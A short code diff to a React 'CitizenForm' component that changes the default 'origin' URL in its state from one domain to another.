@@ -28,7 +28,7 @@ export default function CitizenForm() {
   const [trackCode, setTrackCode] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [errorMessage, setErrorMessage] = useState("");
-  const [origin, setOrigin] = useState("https://tncdtt-qd.io.vn");
+  const [origin, setOrigin] = useState("https://phongtiepdantructruyen-qk2.top");
 
   useEffect(() => {
     if (typeof window !== "undefined") {
